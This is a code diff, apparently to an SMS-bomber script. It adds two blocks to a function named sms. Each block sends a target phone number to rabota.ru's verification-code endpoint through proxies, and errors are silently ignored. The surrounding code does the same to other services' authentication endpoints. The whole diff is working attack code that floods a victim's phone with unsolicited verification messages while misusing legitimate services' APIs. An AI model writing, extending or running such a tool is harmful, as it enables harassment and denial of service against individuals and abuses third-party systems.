@@ -86,6 +86,12 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+					payload = {"request":{"login":number},"request_id":75291684,"application_id":13,"rabota_ru_id":"61e37b73739641004915965152223419","user_tags":[{"id":0,"add_date":"2022-01-16","name":"hr_banners_show"},{"id":0,"add_date":"2022-01-16","name":"web_premium_target"},{"id":0,"add_date":"2022-01-16","name":"courses_widget_target"},{"id":0,"add_date":"2022-01-16","name":"search_exclude_reloc2_target"},{"id":0,"add_date":"2022-01-16","name":"web_search_all_regions2_target1"},{"id":0,"add_date":"2022-01-16","name":"profession_widget_target"},{"id":0,"add_date":"2022-01-16","name":"search_query_profession_tags_control2"},{"id":0,"add_date":"2022-01-16","name":"hr_new_scheduled_action_list_active"}]}
+					requests.post("https://spb.rabota.ru/api-web/v6/code/send.json", json=payload, proxies = proxies)
+				except:
+					pass
+
+				try:
 					num = number
 					num2=""
 					num2+="+"
@@ -521,6 +527,12 @@ def sms(prx, number, tm, code):
 						"username": number
 					}
 					requests.post("https://auth-ext.usvc.bcs.ru/auth/realms/Broker/protocol/openid-connect/token", json=payload)
+				except:
+					pass
+
+				try:
+					payload = {"request":{"login":number},"request_id":75291684,"application_id":13,"rabota_ru_id":"61e37b73739641004915965152223419","user_tags":[{"id":0,"add_date":"2022-01-16","name":"hr_banners_show"},{"id":0,"add_date":"2022-01-16","name":"web_premium_target"},{"id":0,"add_date":"2022-01-16","name":"courses_widget_target"},{"id":0,"add_date":"2022-01-16","name":"search_exclude_reloc2_target"},{"id":0,"add_date":"2022-01-16","name":"web_search_all_regions2_target1"},{"id":0,"add_date":"2022-01-16","name":"profession_widget_target"},{"id":0,"add_date":"2022-01-16","name":"search_query_profession_tags_control2"},{"id":0,"add_date":"2022-01-16","name":"hr_new_scheduled_action_list_active"}]}
+					requests.post("https://spb.rabota.ru/api-web/v6/code/send.json", json=payload, proxies = proxies)
 				except:
 					pass
 
